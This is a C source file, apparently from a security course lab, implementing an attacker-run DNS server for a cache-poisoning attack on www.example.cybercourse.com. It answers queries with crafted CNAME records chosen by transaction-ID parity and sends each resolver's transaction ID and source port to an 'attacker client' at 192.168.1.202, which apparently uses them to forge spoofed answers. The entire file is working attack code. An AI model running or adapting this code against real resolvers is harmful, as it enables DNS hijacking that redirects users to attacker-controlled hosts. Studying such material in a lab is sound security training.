#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <ldns/ldns.h>
#include <stdbool.h>

#define PORT 53
#define CLIENT_PORT 1024
#define BUFFER_SIZE 512

#define CLIENT_IP "192.168.1.202"
#define SPOOFED_IP "6.6.6.6"

#define TARGET_DOMAIN "www.example.cybercourse.com"

// Global flag to control the main processing loop
bool should_continue = true;


// Create a DNS CNAME response packet.
ldns_pkt *create_cname_response(ldns_pkt *query, const char *cname_target) {
    ldns_pkt *response;
    ldns_rr *cname_rr;
    ldns_rdf *owner, *cname_rdf;

    // Initialize a new DNS packet for the response
    response = ldns_pkt_new();

    // Copy the query ID to the response to match the request
    ldns_pkt_set_id(response, ldns_pkt_id(query));

    ldns_pkt_set_qr(response, true);
    ldns_pkt_set_aa(response, true);

    // Set the opcode to match the query and indicate no error
    ldns_pkt_set_opcode(response, ldns_pkt_get_opcode(query));
    ldns_pkt_set_rcode(response, LDNS_RCODE_NOERROR);

    // Add the original query's Question Section to the response
    ldns_rr_list *question_section = ldns_pkt_question(query);
    if (question_section) {
        for (size_t i = 0; i < ldns_rr_list_rr_count(question_section); i++) {
            ldns_rr *question_rr = ldns_rr_list_rr(question_section, i);

            // Clone and push each question record into the response
            ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, ldns_rr_clone(question_rr));
        }
    }

    // Extract the owner name (domain being queried) from the original query
    owner = ldns_rr_owner(ldns_rr_list_rr(ldns_pkt_question(query), 0));

    // Create the CNAME Resource Record (RR)
    cname_rdf = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, cname_target);
    cname_rr = ldns_rr_new();

    // Set the fields of the CNAME record
    ldns_rdf *target = ldns_dname_new_frm_str(cname_target);
    ldns_rr_set_owner(cname_rr, ldns_rdf_clone(owner));
    ldns_rr_set_type(cname_rr, LDNS_RR_TYPE_CNAME);
    ldns_rr_set_class(cname_rr, LDNS_RR_CLASS_IN);
    ldns_rr_set_ttl(cname_rr, 600);
    ldns_rr_set_rdf(cname_rr, cname_rdf, 0);
    ldns_rr_push_rdf(cname_rr, target);

    // Add the constructed CNAME RR to the Answer Section of the response
    ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, cname_rr);

    ldns_rdf_deep_free(cname_rdf);

    return response;
}


// Function to send TXID and port to the attacker client
void send_to_attacker_client(uint16_t txid, uint16_t port) {
    int sockfd;  // Socket file descriptor
    struct sockaddr_in client_addr;  // Structure to hold client address info
    char packet[16];  // Buffer to hold TXID and port as a string

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure attacker client address
    memset(&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(CLIENT_PORT);
    inet_pton(AF_INET, CLIENT_IP, &client_addr.sin_addr);

    // Prepare the packet with TXID and port
    snprintf(packet, sizeof(packet), "%u:%u", txid, port);

    // Send the packet to the attacker client
    if (sendto(sockfd, packet, strlen(packet), 0, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
        perror("Failed to send data to attacker client");
    }

    close(sockfd);
}


// Function to handle incoming DNS requests
void handle_request(int sockfd, struct sockaddr_in *client_addr, socklen_t client_len) {
    char buffer[BUFFER_SIZE];
    static int cname_counter = 1;

    // Receive the DNS query
    int bytes_received = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)client_addr, &client_len);
    if (bytes_received < 0) {
        perror("Failed to receive data");
        return;
    }

    // Parse the DNS query
    ldns_pkt *query;
    ldns_status status = ldns_wire2pkt(&query, (const uint8_t *)buffer, bytes_received);
    if (status != LDNS_STATUS_OK) {
        fprintf(stderr, "Failed to parse DNS query: %s\n", ldns_get_errorstr_by_id(status));
        return;
    }

    // Extract the transaction ID (TXID) from the query
    uint16_t txid = ldns_pkt_id(query);
    uint16_t source_port = ntohs(client_addr->sin_port);

    // Check TXID parity to determine response behavior
    if (txid % 2 != 0) {
        // Odd TXID - Generate a subdomain and create a CNAME response
        char cname_target[256];
        snprintf(cname_target, sizeof(cname_target), "ww%d.attacker.cybercourse.com", cname_counter++);

        ldns_pkt *response = create_cname_response(query, cname_target);
        ldns_rr *opt_rr = ldns_rr_new();
        if (!opt_rr) {
            fprintf(stderr, "Failed to create OPT record.\n");
            ldns_pkt_free(response);
            return;
        }

        // Configure the OPT record properties
        ldns_rr_set_type(opt_rr, LDNS_RR_TYPE_OPT);
        ldns_rr_set_class(opt_rr, 4096);
        ldns_rr_set_ttl(opt_rr, 0x8000);
        ldns_rr_set_owner(opt_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, "."));

        // Add the OPT record to the Additional Section of the response
        ldns_pkt_push_rr(response, LDNS_SECTION_ADDITIONAL, opt_rr);

        // Serialize the DNS response to raw data for sending
        uint8_t *final_wire_data;
        size_t final_wire_size;
        status = ldns_pkt2wire(&final_wire_data, response, &final_wire_size);
        if (status != LDNS_STATUS_OK) {
            fprintf(stderr, "Failed to serialize DNS response: %s\n", ldns_get_errorstr_by_id(status));
            ldns_pkt_free(response);
            return;
        }

        // Send the serialized response back to the client
        sendto(sockfd, final_wire_data, final_wire_size, 0, (struct sockaddr *)client_addr, client_len);

        // Clean up allocated memory
        free(final_wire_data);
        ldns_pkt_free(response);

    } else {
        // Even TXID - Respond with the primary target domain
        ldns_pkt *response = create_cname_response(query, TARGET_DOMAIN);
        ldns_rr *opt_rr = ldns_rr_new();
        if (!opt_rr) {
            fprintf(stderr, "Failed to create OPT record.\n");
            ldns_pkt_free(response);
            return;
        }

        // Configure the OPT record properties
        ldns_rr_set_type(opt_rr, LDNS_RR_TYPE_OPT);
        ldns_rr_set_class(opt_rr, 4096);
        ldns_rr_set_ttl(opt_rr, 0x8000);
        ldns_rr_set_owner(opt_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, "."));

        // Add the OPT record to the Additional Section of the response
        ldns_pkt_push_rr(response, LDNS_SECTION_ADDITIONAL, opt_rr);

        // Serialize the DNS response to raw data for sending
        uint8_t *final_wire_data;
        size_t final_wire_size;
        status = ldns_pkt2wire(&final_wire_data, response, &final_wire_size);
        if (status != LDNS_STATUS_OK) {
            fprintf(stderr, "Failed to serialize DNS response: %s\n", ldns_get_errorstr_by_id(status));
            ldns_pkt_free(response);
            return;
        }

        // Send the serialized response back to the client
        sendto(sockfd, final_wire_data, final_wire_size, 0, (struct sockaddr *)client_addr, client_len);

        // Clean up allocated memory
        free(final_wire_data);
        ldns_pkt_free(response);

        // Notify attacker client with TXID and port details
        send_to_attacker_client(txid, source_port);

        // Stop the server after sending even TXID response
        should_continue = false;
    }

    ldns_pkt_free(query);
}


int main() {
    int sockfd;  // Socket file descriptor
    struct sockaddr_in server_addr, client_addr;  // Server and client address structures
    socklen_t client_len = sizeof(client_addr);  // Length of client address structure

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Zero out the server address structure and configure it
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Bind the socket to the server address and port
    if (bind(sockfd, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    // Main loop to continuously handle incoming requests
    while (should_continue) {
        handle_request(sockfd, &client_addr, client_len);
    }

    close(sockfd);

    return 0;
}